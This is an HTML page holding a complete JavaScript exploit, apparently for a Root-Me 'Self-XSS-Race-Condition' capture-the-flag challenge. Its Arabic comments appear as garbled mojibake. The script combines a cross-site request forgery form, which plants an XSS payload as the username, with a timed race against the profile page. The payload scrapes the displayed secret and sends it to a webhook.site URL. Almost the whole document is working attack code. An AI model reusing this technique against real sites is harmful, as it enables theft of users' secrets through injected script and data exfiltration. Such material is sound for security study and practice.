<!doctype html>
<html>
<body>

<script>
// ğŸ”´ 1) Ø­Ø·ÙŠ Ù„ÙŠÙ†Ùƒ Ø§Ù„ØªØ­Ø¯ÙŠ (Ù…Ù† ØºÙŠØ± /profile ÙˆÙ„Ø§ /login)
const target = "https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-Race-Condition";

// ğŸ”´ 2) Ø­Ø·ÙŠ Ù„ÙŠÙ†Ùƒ webhook Ø¨ØªØ§Ø¹Ùƒ
const webhook = "https://webhook.site/78b00951-69fe-49c7-835f-8f12e8890a6f";

// Ø¥Ø´Ø§Ø±Ø© Ø¥Ù† Ø§Ù„ØµÙØ­Ø© Ø§Ø´ØªØºÙ„Øª
(new Image()).src = webhook + "?stage=boot";

// XSS payload: ÙŠØ¯ÙˆÙ‘Ø± Ø¹Ù„Ù‰ Ø§Ù„Ø³Ø·Ø± Ø§Ù„Ù„ÙŠ ÙÙŠÙ‡ "Your secret" ÙˆÙŠØ¨Ø¹Øª Ø§Ù„Ø³Ø±
const payload = `<img src=x onerror="
  (new Image()).src='${webhook}?stage=xss';
  var t=[...document.querySelectorAll('p')]
    .map(p=>p.textContent)
    .find(t=>t.includes('Your secret'));
  if(t){
    var s=t.split(':').slice(1).join(':').trim();
    (new Image()).src='${webhook}?flag='+encodeURIComponent(s);
  }
">`;

// ØªØ¬Ù‡ÙŠØ² payload Ù„Ù„Ø¥Ø±Ø³Ø§Ù„ ÙƒÙ†Øµ
const escaped = JSON.stringify(payload).slice(1, -1);
const prefix = '{"username":"' + escaped + '","secret":"x';
const suffix = '"}';

// ÙØªØ­ ØµÙØ­Ø© Ø§Ù„Ø¨Ø±ÙˆÙØ§ÙŠÙ„ ÙÙŠ Ù†Ø§ÙØ°Ø©
window.open(target + "/profile", "prof");

// Ø¥Ù†Ø´Ø§Ø¡ ÙÙˆØ±Ù… POST Ù„ØªØºÙŠÙŠØ± Ø§Ù„Ù€ username
const form = document.createElement("form");
form.method = "POST";
form.action = target + "/login";
form.enctype = "text/plain";

const input = document.createElement("input");
input.name = prefix;
input.value = suffix;
form.appendChild(input);
document.body.appendChild(form);

// ğŸ” Ø§Ù„ØªÙˆÙ‚ÙŠØª (ØºÙŠÙ‘Ø±ÙŠ Ø§Ù„Ø±Ù‚Ù… Ù„Ùˆ Ù…Ø§Ø´ØªØºÙ„Ø´)
setTimeout(() => {
  (new Image()).src = webhook + "?stage=submitted";
  form.submit();
}, 40); // Ø¬Ø±Ù‘Ø¨ÙŠ 20 / 60 / 100 Ù„Ùˆ Ù„Ø²Ù…

</script>

</body>
</html>
